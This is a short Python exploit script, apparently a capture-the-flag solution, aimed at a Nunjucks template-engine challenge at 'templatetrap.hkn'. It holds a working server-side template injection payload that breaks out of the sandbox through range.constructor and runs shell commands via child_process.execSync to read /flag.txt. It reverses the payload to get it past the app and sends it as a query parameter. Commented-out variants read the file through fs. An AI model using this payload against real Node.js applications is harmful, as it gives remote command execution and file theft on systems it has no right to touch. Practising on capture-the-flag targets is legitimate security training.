import requests

URL = "http://templatetrap.hkn/"


# http://web.archive.org/web/20200221221124/http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
# payload = """{{range.constructor("return
# global.process.mainModule.require('fs').readFileSync('/flag.txt').toString('base64')")}}"""
# payload = """{{range.constructor("console.log(123)")()}}"""
payload = """
{{range.constructor("return\tglobal.process.mainModule.require('child_process').execSync('cat\t/flag.txt')")()}}
"""

reversed_payload = payload[::-1]

req = requests.get(URL, params={
    "value": reversed_payload
})

print(req.text)
